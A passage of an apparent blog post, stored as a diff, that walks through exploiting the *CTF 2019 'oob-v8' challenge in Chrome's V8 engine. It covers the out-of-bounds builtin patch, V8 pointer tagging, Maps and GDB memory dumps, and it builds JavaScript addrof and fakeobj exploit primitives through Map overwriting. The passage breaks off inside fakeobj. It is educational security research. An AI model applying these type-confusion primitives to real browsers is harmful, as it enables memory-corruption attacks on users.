@@ -1,0 +1,929 @@
+I"��<h1 id="introduction">Introduction</h1>
+
+<p>I’ve recently been researching browsers, specifically JavaScript Engine exploitation in Chrome’s v8. Being a CTF player myself, I thought doing a fairly recent CTF challenge might help me wrap my head around some of the exploitation techniques that are widely used provided a vulnerability <strong><em>does</em></strong> exist.</p>
+
+<p>I picked the challenge <code class="highlighter-rouge">oob-v8</code> from <code class="highlighter-rouge">*CTF 2019</code>, because it seems as though all the writeups for it are fairly incomplete. They either assume a bunch of prerequisite knowledge, or just don’t explain things well. I spent a lot of time debugging and understanding every part of my exploit, and popped calc in two separate ways.</p>
+
+<p>The other reason I wanted to create this writeup is because most of the prerequisite knowledge required is scattered around a bunch of different places. I wanted to bring together all of that information in a single post, so that the reader will not need to read from multiple sources to understand the writeup.</p>
+
+<p>If you have any questions about anything in this writeup, feel free to DM me through Twitter <a href="https://twitter.com/farazsth98">@farazsth98</a>. DMs will always be open.</p>
+
+<h2 id="prerequisite-knowledge">Prerequisite Knowledge</h2>
+
+<p>The only prerequisite knowledge required to understand this writeup will be an understanding of how Linux userspace exploitation works. You will need to know your way around GDB. Knowledge of JavaScript will more than likely not be required as you can learn along the way if you so choose. The MDN documentation is very good.</p>
+
+<h2 id="building-d8">Building d8</h2>
+
+<p><code class="highlighter-rouge">d8</code> is the name given to the JavaScript REPL created by Google for v8. I will build both the release and debug versions of it.</p>
+
+<p>For reference, I am doing all of this on an Ubuntu 18.04.3 LTS vm.</p>
+
+<p>You will first have to install Google’s <code class="highlighter-rouge">depot_tools</code> and add the folder to your PATH by following the guide <a href="https://commondatastorage.googleapis.com/chrome-infra-docs/flat/depot_tools/docs/html/depot_tools_tutorial.html#_setting_up">here</a>:</p>
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>pwn@ubuntu:~/tools<span class="nv">$ </span>git clone https://chromium.googlesource.com/chromium/tools/depot_tools.git
+pwn@ubuntu:~/tools<span class="nv">$ </span><span class="nb">echo</span> <span class="s2">"export PATH=/home/pwn/tools/depot_tools:</span><span class="nv">$PATH</span><span class="s2">"</span> <span class="o">&gt;&gt;</span> ~/.bashrc
+</code></pre></div></div>
+
+<p>Next, download the challenge archive from <a href="https://github.com/Changochen/CTF/raw/master/2019/*ctf/Chrome.tar.gz">here</a>. You will only need the <code class="highlighter-rouge">oob.diff</code> file from inside it. Run the following commands to download and build the correct version of d8:</p>
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>pwn@ubuntu:~<span class="nv">$ </span>fetch v8
+pwn@ubuntu:~<span class="nv">$ </span><span class="nb">cd </span>v8
+pwn@ubuntu:~/v8<span class="nv">$ </span>./build/install-build-deps.sh <span class="c"># Assumes you're using apt</span>
+pwn@ubuntu:~/v8<span class="nv">$ </span>git checkout 6dc88c191f5ecc5389dc26efa3ca0907faef3598
+pwn@ubuntu:~/v8<span class="nv">$ </span>gclient <span class="nb">sync
+</span>pwn@ubuntu:~/v8<span class="nv">$ </span>git apply ../oob.diff
+pwn@ubuntu:~/v8<span class="nv">$ </span>./tools/dev/v8gen.py x64.release
+pwn@ubuntu:~/v8<span class="nv">$ </span>ninja <span class="nt">-C</span> ./out.gn/x64.release <span class="c"># Release version</span>
+pwn@ubuntu:~/v8<span class="nv">$ </span>./tools/dev/v8gen.py x64.debug
+pwn@ubuntu:~/v8<span class="nv">$ </span>ninja <span class="nt">-C</span> ./out.gn/x64.debug <span class="c"># Debug version</span>
+</code></pre></div></div>
+
+<p>The builds will take a while, but afterwards, you will find the release build in <code class="highlighter-rouge">v8/out.gn/x64.release/d8</code>, and the debug build in <code class="highlighter-rouge">v8/out.gn/x64.debug/d8</code>.</p>
+
+<h2 id="the-patch">The patch</h2>
+
+<p>First, let’s take a brief look at the patch file. You don’t have to understand every single line of code (the v8 code base is huge after all), but you should be able to find the vulnerability fairly quickly:</p>
+<div class="language-diff highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gh">diff --git a/src/bootstrapper.cc b/src/bootstrapper.cc
+index b027d36..ef1002f 100644
+</span><span class="gd">--- a/src/bootstrapper.cc
+</span><span class="gi">+++ b/src/bootstrapper.cc
+</span><span class="p">@@ -1668,6 +1668,8 @@</span> void Genesis::InitializeGlobal(Handle&lt;JSGlobalObject&gt; global_object,
+                           Builtins::kArrayPrototypeCopyWithin, 2, false);
+     SimpleInstallFunction(isolate_, proto, "fill",
+                           Builtins::kArrayPrototypeFill, 1, false);
+<span class="gi">+    SimpleInstallFunction(isolate_, proto, "oob",
++                          Builtins::kArrayOob,2,false);
+</span>     SimpleInstallFunction(isolate_, proto, "find",
+                           Builtins::kArrayPrototypeFind, 1, false);
+     SimpleInstallFunction(isolate_, proto, "findIndex",
+<span class="gh">diff --git a/src/builtins/builtins-array.cc b/src/builtins/builtins-array.cc
+index 8df340e..9b828ab 100644
+</span><span class="gd">--- a/src/builtins/builtins-array.cc
+</span><span class="gi">+++ b/src/builtins/builtins-array.cc
+</span><span class="p">@@ -361,6 +361,27 @@</span> V8_WARN_UNUSED_RESULT Object GenericArrayPush(Isolate* isolate,
+   return *final_length;
+ }
+ }  // namespace
+<span class="gi">+BUILTIN(ArrayOob){
++    uint32_t len = args.length();
++    if(len &gt; 2) return ReadOnlyRoots(isolate).undefined_value();
++    Handle&lt;JSReceiver&gt; receiver;
++    ASSIGN_RETURN_FAILURE_ON_EXCEPTION(
++            isolate, receiver, Object::ToObject(isolate, args.receiver()));
++    Handle&lt;JSArray&gt; array = Handle&lt;JSArray&gt;::cast(receiver);
++    FixedDoubleArray elements = FixedDoubleArray::cast(array-&gt;elements());
++    uint32_t length = static_cast&lt;uint32_t&gt;(array-&gt;length()-&gt;Number());
++    if(len == 1){
++        //read
++        return *(isolate-&gt;factory()-&gt;NewNumber(elements.get_scalar(length)));
++    }else{
++        //write
++        Handle&lt;Object&gt; value;
++        ASSIGN_RETURN_FAILURE_ON_EXCEPTION(
++                isolate, value, Object::ToNumber(isolate, args.at&lt;Object&gt;(1)));
++        elements.set(length,value-&gt;Number());
++        return ReadOnlyRoots(isolate).undefined_value();
++    }
++}
+</span> 
+ BUILTIN(ArrayPush) {
+   HandleScope scope(isolate);
+<span class="gh">diff --git a/src/builtins/builtins-definitions.h b/src/builtins/builtins-definitions.h
+index 0447230..f113a81 100644
+</span><span class="gd">--- a/src/builtins/builtins-definitions.h
+</span><span class="gi">+++ b/src/builtins/builtins-definitions.h
+</span><span class="p">@@ -368,6 +368,7 @@</span> namespace internal {
+   TFJ(ArrayPrototypeFlat, SharedFunctionInfo::kDontAdaptArgumentsSentinel)     \
+   /* https://tc39.github.io/proposal-flatMap/#sec-Array.prototype.flatMap */   \
+   TFJ(ArrayPrototypeFlatMap, SharedFunctionInfo::kDontAdaptArgumentsSentinel)  \
+<span class="gi">+  CPP(ArrayOob)                                                                \
+</span>                                                                                \
+   /* ArrayBuffer */                                                            \
+   /* ES #sec-arraybuffer-constructor */                                        \
+<span class="gh">diff --git a/src/compiler/typer.cc b/src/compiler/typer.cc
+index ed1e4a5..c199e3a 100644
+</span><span class="gd">--- a/src/compiler/typer.cc
+</span><span class="gi">+++ b/src/compiler/typer.cc
+</span><span class="p">@@ -1680,6 +1680,8 @@</span> Type Typer::Visitor::JSCallTyper(Type fun, Typer* t) {
+       return Type::Receiver();
+     case Builtins::kArrayUnshift:
+       return t-&gt;cache_-&gt;kPositiveSafeInteger;
+<span class="gi">+    case Builtins::kArrayOob:
++      return Type::Receiver();
+</span> 
+     // ArrayBuffer functions.
+     case Builtins::kArrayBufferIsView:
+</code></pre></div></div>
+
+<p>Let’s break it down a little bit:</p>
+
+<ul>
+  <li>The two lines of code added in <code class="highlighter-rouge">src/bootstrapper.cc</code> essentially installs a builtin function for arrays called <code class="highlighter-rouge">oob</code>.</li>
+  <li>The lines of code added in <code class="highlighter-rouge">src/builtins/builtins-definitions.h</code> and <code class="highlighter-rouge">src/compiler.typer.cc</code> are not important. They are required to add this builtin function correctly.</li>
+  <li>The lines of code added into <code class="highlighter-rouge">src/builtins/builtins-array.cc</code> are important. The vulnerability lies here.</li>
+</ul>
+
+<p>I urge the reader to take a look at the code added to <code class="highlighter-rouge">src/builtins/builtins-array.cc</code> and try to spot the vulnerability. Even without any further context, it should be easy to spot.</p>
+
+<ul>
+  <li>The function will initially check if the number of arguments is greater than 2 (the first argument is always the <code class="highlighter-rouge">this</code> argument). If it is, it returns undefined.</li>
+  <li>If there is only one argument (<code class="highlighter-rouge">this</code>), it will cast the array into a <code class="highlighter-rouge">FixedDoubleArray</code> before returning the element at <code class="highlighter-rouge">array[length]</code>.</li>
+  <li>If there are two arguments (<code class="highlighter-rouge">this</code> and <code class="highlighter-rouge">value</code>), it will write <code class="highlighter-rouge">value</code> as a float into <code class="highlighter-rouge">array[length]</code>.</li>
+</ul>
+
+<p>Now, since arrays start with index 0, it is evident that <code class="highlighter-rouge">array[length]</code> results in an out-of-bounds access by one index at the end of the array.</p>
+
+<p>The question now is, how do we exploit it? In order to figure out what we can do with this vulnerability, we first have to find out what exists past an array’s last index.</p>
+
+<h2 id="pointer-tagging">Pointer tagging</h2>
+
+<p>Before we try to answer the question of what exists past the end of an array, I should explain that v8 uses a pointer tagging mechanism to distinguish between <strong>pointers</strong>, <strong>doubles</strong>, and <strong>Smis</strong>, which stands for <code class="highlighter-rouge">immediate small integer</code>. This information can be found in <code class="highlighter-rouge">src/objects.h</code>. Essentially, we have the following scenario:</p>
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nl">Double:</span> <span class="n">Shown</span> <span class="n">as</span> <span class="n">the</span> <span class="mi">64</span><span class="o">-</span><span class="n">bit</span> <span class="n">binary</span> <span class="n">representation</span> <span class="n">without</span> <span class="n">any</span> <span class="n">changes</span>
+<span class="n">Smi</span><span class="o">:</span> <span class="n">Represented</span> <span class="n">as</span> <span class="n">value</span> <span class="o">&lt;&lt;</span> <span class="mi">32</span><span class="p">,</span> <span class="n">i</span><span class="p">.</span><span class="n">e</span> <span class="mh">0xdeadbeef</span> <span class="n">is</span> <span class="n">represented</span> <span class="n">as</span> <span class="mh">0xdeadbeef00000000</span>
+<span class="n">Pointers</span><span class="o">:</span> <span class="n">Represented</span> <span class="n">as</span> <span class="n">addr</span> <span class="o">&amp;</span> <span class="mi">1</span><span class="p">.</span> <span class="mh">0x2233ad9c2ed8</span> <span class="n">is</span> <span class="n">represented</span> <span class="n">as</span> <span class="mh">0x2233ad9c2ed9</span>
+</code></pre></div></div>
+
+<p>There is a little more to this, especially when TypedArrays are involved, but I will cover that later when it is relevant. I mention this now because examining any addresses in GDB will require you to subtract 1 from the address before examination (to mask off the last bit). You will see this in action whenever I examine memory addresses in GDB.</p>
+
+<p>The other important thing to note here is that any information leaks you get will be output in a floating point representation, since they have to be output as their 64-bit binary representation. V8 just doesn’t have a way to express 64-bit integers normally. You will see the floating point information leaks in action further below, but as for right now, we need some way to convert those floating point values into hexadecimal addresses so we can use them easily in GDB.</p>
+
+<p>I use the following code to do the conversions:</p>
+<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">/// Helper functions to convert between float and integer primitives</span>
+<span class="kd">var</span> <span class="nx">buf</span> <span class="o">=</span> <span class="k">new</span> <span class="nb">ArrayBuffer</span><span class="p">(</span><span class="mi">8</span><span class="p">);</span> <span class="c1">// 8 byte array buffer</span>
+<span class="kd">var</span> <span class="nx">f64_buf</span> <span class="o">=</span> <span class="k">new</span> <span class="nb">Float64Array</span><span class="p">(</span><span class="nx">buf</span><span class="p">);</span>
+<span class="kd">var</span> <span class="nx">u64_buf</span> <span class="o">=</span> <span class="k">new</span> <span class="nb">Uint32Array</span><span class="p">(</span><span class="nx">buf</span><span class="p">);</span>
+
+<span class="kd">function</span> <span class="nx">ftoi</span><span class="p">(</span><span class="nx">val</span><span class="p">)</span> <span class="p">{</span> <span class="c1">// typeof(val) = float</span>
+    <span class="nx">f64_buf</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="nx">val</span><span class="p">;</span>
+    <span class="k">return</span> <span class="nx">BigInt</span><span class="p">(</span><span class="nx">u64_buf</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span> <span class="o">+</span> <span class="p">(</span><span class="nx">BigInt</span><span class="p">(</span><span class="nx">u64_buf</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span> <span class="o">&lt;&lt;</span> <span class="mi">32</span><span class="nx">n</span><span class="p">);</span> <span class="c1">// Watch for little endianness</span>
+<span class="p">}</span>
+
+<span class="kd">function</span> <span class="nx">itof</span><span class="p">(</span><span class="nx">val</span><span class="p">)</span> <span class="p">{</span> <span class="c1">// typeof(val) = BigInt</span>
+    <span class="nx">u64_buf</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="nb">Number</span><span class="p">(</span><span class="nx">val</span> <span class="o">&amp;</span> <span class="mh">0xffffffff</span><span class="nx">n</span><span class="p">);</span>
+    <span class="nx">u64_buf</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="nb">Number</span><span class="p">(</span><span class="nx">val</span> <span class="o">&gt;&gt;</span> <span class="mi">32</span><span class="nx">n</span><span class="p">);</span>
+    <span class="k">return</span> <span class="nx">f64_buf</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>Essentially, you create an 8 byte <code class="highlighter-rouge">ArrayBuffer</code> and create two TypedArrays that share this buffer, a <code class="highlighter-rouge">Float64Array</code> and a <code class="highlighter-rouge">Uint32Array</code>. You then have two functions:</p>
+<ol>
+  <li><code class="highlighter-rouge">ftoi</code> takes in a float value and converts it into a <code class="highlighter-rouge">BigInt</code> value, taking care of little endianness as well. You can print this as a hex representation by doing something like the following: <code class="highlighter-rouge">"0x" + ftoi(val).toString(16)</code></li>
+  <li><code class="highlighter-rouge">itof</code> takes in a BigInt value and converts it into a float value. This is used when you want to write an address to memory (you can’t simply write a BigInt value into memory. There <strong><em>is</em></strong> a way to write integers as is using an <code class="highlighter-rouge">ArrayBuffer</code> and a <code class="highlighter-rouge">DataView</code> object, but in order to get to that stage, you have to first do direct floating point writes. More on this later).</li>
+</ol>
+
+<p>Put the above code into a file, say <code class="highlighter-rouge">file.js</code>. You can run <code class="highlighter-rouge">d8</code> with it like <code class="highlighter-rouge">./d8 --shell ./file.js</code> to get access to the functions through the REPL.</p>
+
+<h2 id="what-exists-past-the-end-of-an-array">What exists past the end of an array?</h2>
+
+<p>There are two ways you can figure this out. The much harder way is to go to <a href="https://source.chromium.org">https://source.chromium.org</a> and try to find the layout of an array by reading the source code. However, that requires you to already have a deep understanding of the v8 code base. Since pointers are tagged, it means that v8 cannot just let the compiler define the in-memory layout of Objects. It is entirely done within the source code, and if you don’t know where to look / don’t understand the different parts of the code base, you will not be able to figure out the layout of an array by reading the source code.</p>
+
+<p>Instead, let us use the fact that we can build a debug version of <code class="highlighter-rouge">d8</code> and run it through a debugger to view the memory layout of an array in real time. Note that you have to run <code class="highlighter-rouge">d8</code> with <code class="highlighter-rouge">./d8 --allow-natives-syntax</code> to get access to some of the debugging functions, such as <code class="highlighter-rouge">%DebugPrint()</code>.</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>pwn@ubuntu:~/v8/v8/out.gn/x64.debug$ gdb ./d8
+GEF for linux ready, type `gef' to start, `gef config' to configure
+77 commands loaded for GDB 8.1.0.20180409-git using Python engine 3.6
+[*] 3 commands could not be loaded, run `gef missing` to know why.
+Reading symbols from ./d8...done.
+
+gef➤  run --allow-natives-syntax
+Starting program: /home/pwn/v8/v8/out.gn/x64.debug/d8 --allow-natives-syntax
+[Thread debugging using libthread_db enabled]
+Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
+[New Thread 0x7ffff30ec700 (LWP 12183)]
+V8 version 7.5.0 (candidate)
+
+d8&gt; var a = [1.1, 2.2];
+undefined
+d8&gt; %DebugPrint(a);
+DebugPrint: 0x1dbbe77cdd79: [JSArray]
+ - map: 0x11304a782ed9 &lt;Map(PACKED_DOUBLE_ELEMENTS)&gt; [FastProperties]
+ - prototype: 0x384656691111 &lt;JSArray[0]&gt;
+ - elements: 0x1dbbe77cdd59 &lt;FixedDoubleArray[2]&gt; [PACKED_DOUBLE_ELEMENTS]
+ - length: 2
+ - properties: 0x172dc3640c71 &lt;FixedArray[0]&gt; {
+    #length: 0x075e9d5801a9 &lt;AccessorInfo&gt; (const accessor descriptor)
+ }
+ - elements: 0x1dbbe77cdd59 &lt;FixedDoubleArray[2]&gt; {
+           0: 1.1
+           1: 2.2
+ }
+0x11304a782ed9: [Map]
+ - type: JS_ARRAY_TYPE
+ - instance size: 32
+ - inobject properties: 0
+ - elements kind: PACKED_DOUBLE_ELEMENTS
+ - unused property fields: 0
+ - enum length: invalid
+ - back pointer: 0x11304a782e89 &lt;Map(HOLEY_SMI_ELEMENTS)&gt;
+ - prototype_validity cell: 0x075e9d580609 &lt;Cell value= 1&gt;
+ - instance descriptors #1: 0x384656691f49 &lt;DescriptorArray[1]&gt;
+ - layout descriptor: (nil)
+ - transitions #1: 0x384656691eb9 &lt;TransitionArray[4]&gt;Transition array #1:
+     0x172dc3644ba1 &lt;Symbol: (elements_transition_symbol)&gt;: (transition to HOLEY_DOUBLE_ELEMENTS) -&gt; 0x11304a782f29 &lt;Map(HOLEY_DOUBLE_ELEMENTS)&gt;
+
+ - prototype: 0x384656691111 &lt;JSArray[0]&gt;
+ - constructor: 0x384656690ec1 &lt;JSFunction Array (sfi = 0x75e9d58aca1)&gt;
+ - dependent code: 0x172dc36402c1 &lt;Other heap object (WEAK_FIXED_ARRAY_TYPE)&gt;
+ - construction counter: 0
+
+[1.1, 2.2]
+</code></pre></div></div>
+
+<p>That is a lot of information. Lets just view the array in memory. Remember, pointers are tagged and will require you to subtract 1 from them before examining:</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gef➤  x/4gx 0x1dbbe77cdd79-1
+0x1dbbe77cdd78:	0x000011304a782ed9	0x0000172dc3640c71 &lt;-- JSArray
+0x1dbbe77cdd88:	0x00001dbbe77cdd59	0x0000000200000000
+</code></pre></div></div>
+
+<p>Now, corroborating with the debug information given to us, we know that the first address corresponds to this array’s <code class="highlighter-rouge">Map</code>. The second address corresponds to the array’s <code class="highlighter-rouge">properties</code>. The third address corresponds to this array’s <code class="highlighter-rouge">elements</code>, which is defined as a <code class="highlighter-rouge">FixedDoubleArray[2]</code>. We can see the <code class="highlighter-rouge">elements</code> pointer points to a memory address that is just before this array. Viewing the <code class="highlighter-rouge">elements</code> now, we find this:</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gef➤  x/10gx 0x00001dbbe77cdd59-1  &lt;- access the elements pointer
+0x1dbbe77cdd58:	0x0000172dc36414f9	0x0000000200000000 &lt;-- FixedDoubleArray
+0x1dbbe77cdd68:	0x3ff199999999999a	0x400199999999999a
+0x1dbbe77cdd78:	0x000011304a782ed9	0x0000172dc3640c71 &lt;-- JSArray
+0x1dbbe77cdd88:	0x00001dbbe77cdd59	0x0000000200000000
+0x1dbbe77cdd98:	0x0000172dc3640941	0x00000adc678412a2
+gef➤  p/f 0x3ff199999999999a
+$1 = 1.1000000000000001
+gef➤  p/f 0x400199999999999a
+$2 = 2.2000000000000002
+</code></pre></div></div>
+
+<p>So, <code class="highlighter-rouge">var a</code> is a <code class="highlighter-rouge">JSArray</code>, and it’s <code class="highlighter-rouge">elements</code> pointer points to a <code class="highlighter-rouge">FixedDoubleArray</code> (which has its own <code class="highlighter-rouge">Map</code>) at <code class="highlighter-rouge">&amp;JSArray-0x30</code> with the array values inlined starting from <code class="highlighter-rouge">elements[2]</code>. The <code class="highlighter-rouge">0x0000000200000000</code> is an <code class="highlighter-rouge">Smi</code> that corresponds to the <code class="highlighter-rouge">FixedDoubleArray</code>’s length (2 in this case, because remember, an <code class="highlighter-rouge">Smi</code> will be <code class="highlighter-rouge">value &lt;&lt; 32</code>).</p>
+
+<p>We can finally answer the question of “What exists past the end of an array?”. If we access <code class="highlighter-rouge">a.oob()</code>, it will access the <code class="highlighter-rouge">Map</code> of the <code class="highlighter-rouge">JSArray</code>, since that is what comes immediately after the last index of the <code class="highlighter-rouge">FixedDoubleArray</code>.</p>
+
+<p>Let’s test this out. We cannot just do <code class="highlighter-rouge">a.oob()</code> on the debug version, as the debug version has runtime assertions that prevent out of bounds accesses (it helps fuzzers catch out of bounds accesses, amongst other things). We can see the effect of <code class="highlighter-rouge">a.oob()</code> on the release version:</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gef➤  run --allow-natives-syntax --shell ./pwn.js 
+Starting program: /home/pwn/v8/v8/out.gn/x64.release/d8 --allow-natives-syntax --shell ./util.js
+[Thread debugging using libthread_db enabled]
+Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
+[New Thread 0x7ffff661c700 (LWP 2334)]
+V8 version 7.5.0 (candidate)
+
+d8&gt; var a = [1.1, 2.2];
+undefined
+d8&gt; %DebugPrint(a);
+0x207f7ce4e139 &lt;JSArray[2]&gt;
+[1.1, 2.2]
+d8&gt; a.oob();         
+2.8870439231963e-311  &lt;- As explained, we get a floating point representation
+d8&gt; "0x" + ftoi(a.oob()).toString(16);
+"0x55088482ed9"
+
+gef➤  x/4gx 0x207f7ce4e139-1
+0x207f7ce4e138:	0x0000055088482ed9	0x00001c26fc480c71
+0x207f7ce4e148:	0x0000207f7ce4e119	0x0000000200000000
+</code></pre></div></div>
+
+<p>As you can see, <code class="highlighter-rouge">a.oob()</code> returns <code class="highlighter-rouge">0x55088482ed9</code>, which is the same value as the Map of <code class="highlighter-rouge">a</code> (remember the Map is the very first address when examining <code class="highlighter-rouge">a</code> in memory). We used <code class="highlighter-rouge">ftoi</code> to convert the floating point information leak (the address of the Map) to a hexadecimal representation.</p>
+
+<h2 id="what-is-a-map">What is a Map?</h2>
+
+<p>Now that we know we have the ability to overwrite a <code class="highlighter-rouge">JSArray</code>’s <code class="highlighter-rouge">Map</code>, we have to understand what a map is in order to figure out how we can exploit this vulnerability.</p>
+
+<p>This section will only briefly cover what a Map is. <a href="https://twitter.com/5aelo">saelo</a> covers this in much greater depth in his phrack paper <a href="http://www.phrack.org/papers/jit_exploitation.html">here</a>. I urge the reader to read that if required.</p>
+
+<p>saelo’s phrack paper says the following:</p>
+<blockquote>
+  <p>The Map of an object (arrays are objects) is a data structure that contains information such as:</p>
+  <ul>
+    <li>The dynamic type of the object, i.e. String, Uint8Array, HeapNumber, …</li>
+    <li>The size of the object in bytes</li>
+    <li>The properties of the object and where they are stored</li>
+    <li>The type of the array elements, e.g. unboxed doubles or tagged pointers</li>
+    <li>The prototype of the object if any</li>
+  </ul>
+
+  <p>While the property names are usually stored in the Map, the property values are stored within the object itself in one of several possible regions. The Map then provides the exact location of the property value in the respective region.</p>
+</blockquote>
+
+<p>Essentially, the Map defines how an object should be accessed. Whether you access an object by doing <code class="highlighter-rouge">object["field"]</code>, or you access an array by doing <code class="highlighter-rouge">array[index]</code>, the Map of that object / array will tell the JS engine where to find that specific element in memory. The reason Maps are used in the first place is because looking up values is very expensive. Maps act as a sort of dictionary. Multiple objects / arrays can share the same map if they have the same layout. Again, check out saelo’s phrack paper for more details.</p>
+
+<p>For example, remember the <code class="highlighter-rouge">JSArray</code> from above? If you try to access <code class="highlighter-rouge">a[0]</code>, the Map of the <code class="highlighter-rouge">JSArray</code> would tell the JS engine to go to the array, access its <code class="highlighter-rouge">elements</code> pointer, and return the value at <code class="highlighter-rouge">elements[2]</code> as that corresponds to the value at index 0 of <code class="highlighter-rouge">1.1</code> (Scroll up if this doesn’t make sense).</p>
+
+<p>Remember that we have the ability to overwrite an array’s <code class="highlighter-rouge">Map</code> with one of our own. In this way, we can cause a type confusion within the JS engine if we overwrite one array’s map with the map of a different array.</p>
+
+<p>In order to see how we can abuse this, let us see what a different array’s map looks like. Let us take an array of Objects:</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>d8&gt; var obj = {"A":1.1};
+undefined
+d8&gt; var obj_arr = [obj];
+undefined
+d8&gt; %DebugPrint(obj);
+0x21885d38e0d9 &lt;Object map = 0x17d0ea80ab39&gt;
+{A: 1.1}
+d8&gt; %DebugPrint(obj_arr);
+0x21885d390561 &lt;JSArray[1]&gt;
+[{A: 1.1}]
+
+gef➤  x/4gx 0x21885d390561-1
+0x21885d390560:	0x000017d0ea802f79	0x0000099148780c71
+0x21885d390570:	0x000021885d390549	0x0000000100000000
+gef➤  x/4gx 0x000021885d390549-1 &lt;- access elements pointer
+0x21885d390548:	0x0000099148780801	0x0000000100000000
+0x21885d390558:	0x000021885d38e0d9	0x000017d0ea802f79
+</code></pre></div></div>
+
+<p>As you can see, the <code class="highlighter-rouge">Map</code> of an array of objects is a little different. Where the float array had a float value at index 0, the object array has the address of the actual <code class="highlighter-rouge">obj</code> in the same place. If you attempt to access <code class="highlighter-rouge">obj_arr[0]</code>, it will not just print out the floating point representation of the the memory address of <code class="highlighter-rouge">obj</code> at index 0, but it will somehow parse it and print <code class="highlighter-rouge">{A: 1.1}</code>.</p>
+
+<p>So, what happens if we leak the map of a float array and overwrite the object array’s map with it? Instead of treating index 0 as a memory address, it should just treat it as a float value. Accessing index 0 should then leak the address of <code class="highlighter-rouge">obj</code> as a float, right?</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>d8&gt; var float_arr_map = float_arr.oob();
+undefined
+d8&gt; var obj = {"A":1.1};
+undefined
+d8&gt; var obj_arr = [obj];
+undefined
+d8&gt; obj_arr.oob(float_arr_map); &lt;- overwrite obj_arr's map
+undefined
+d8&gt; "0x" + ftoi(obj_arr[0]).toString(16);
+"0x3541b65506a9"
+d8&gt; %DebugPrint(obj);
+0x3541b65506a9 &lt;Object map = 0x391a4148ab39&gt;
+{A: 1.1}
+</code></pre></div></div>
+
+<p>Success! In JS engine exploitation terminology, this is what is called an <code class="highlighter-rouge">addrof</code> primitive. The inverse of this (if we put a memory address at index 0 of our float array and change its map to that of the object array) is called a <code class="highlighter-rouge">fakeobj</code> primitive, as it allows you to place a fake object anywhere in memory in order to read from and write to it. We can place this fake object in a memory region where we can control it’s Map and <code class="highlighter-rouge">elements</code> pointer, so we can easily read from and write to arbitrary memory addresses.</p>
+
+<p>For now, we can add these to our <code class="highlighter-rouge">exploit.js</code> script as the <code class="highlighter-rouge">addrof</code> and <code class="highlighter-rouge">fakeobj</code> functions, as follows:</p>
+<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">/// Construct addrof primitive</span>
+<span class="kd">var</span> <span class="nx">temp_obj</span> <span class="o">=</span> <span class="p">{</span><span class="dl">"</span><span class="s2">A</span><span class="dl">"</span><span class="p">:</span><span class="mi">1</span><span class="p">};</span>
+<span class="kd">var</span> <span class="nx">temp_obj_arr</span> <span class="o">=</span> <span class="p">[</span><span class="nx">temp_obj</span><span class="p">];</span>
+<span class="kd">var</span> <span class="nx">fl_arr</span> <span class="o">=</span> <span class="p">[</span><span class="mf">1.1</span><span class="p">,</span> <span class="mf">1.2</span><span class="p">,</span> <span class="mf">1.3</span><span class="p">,</span> <span class="mf">1.4</span><span class="p">];</span>
+<span class="kd">var</span> <span class="nx">map1</span> <span class="o">=</span> <span class="nx">obj_arr</span><span class="p">.</span><span class="nx">oob</span><span class="p">();</span>
+<span class="kd">var</span> <span class="nx">map2</span> <span class="o">=</span> <span class="nx">fl_arr</span><span class="p">.</span><span class="nx">oob</span><span class="p">();</span>
+
+<span class="kd">function</span> <span class="nx">addrof</span><span class="p">(</span><span class="nx">in_obj</span><span class="p">)</span> <span class="p">{</span>
+    <span class="c1">// First, put the obj whose address we want to find into index 0</span>
+    <span class="nx">temp_obj_arr</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="nx">in_obj</span><span class="p">;</span>
+
+    <span class="c1">// Change the obj array's map to the float array's map</span>
+    <span class="nx">temp_obj_arr</span><span class="p">.</span><span class="nx">oob</span><span class="p">(</span><span class="nx">map2</span><span class="p">);</span>
+
+    <span class="c1">// Get the address by accessing index 0</span>
+    <span class="kd">let</span> <span class="nx">addr</span> <span class="o">=</span> <span class="nx">temp_obj_arr</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
+
+    <span class="c1">// Set the map back</span>
+    <span class="nx">temp_obj_arr</span><span class="p">.</span><span class="nx">oob</span><span class="p">(</span><span class="nx">map1</span><span class="p">);</span>
+
+    <span class="c1">// Return the address as a BigInt</span>
+    <span class="k">return</span> <span class="nx">ftoi</span><span class="p">(</span><span class="nx">addr</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="kd">function</span> <span class="nx">fakeobj</span><span class="p">(</span><span class="nx">addr</span><span class="p">)</span> <span class="p">{</span>
+    <span class="c1">// First, put the address as a float into index 0 of the float array</span>
+    <span class="nx">float_arr</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="nx">itof</span><span class="p">(</span><span class="nx">addr</span><span class="p">);</span>
+
+    <span class="c1">// Change the float array's map to the obj array's map</span>
+    <span class="nx">float_arr</span><span class="p">.</span><span class="nx">oob</span><span class="p">(</span><span class="nx">obj_arr_map</span><span class="p">);</span>
+
+    <span class="c1">// Get a "fake" object at that memory location and store it</span>
+    <span class="kd">let</span> <span class="nx">fake</span> <span class="o">=</span> <span class="nx">float_arr</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
+
+    <span class="c1">// Set the map back</span>
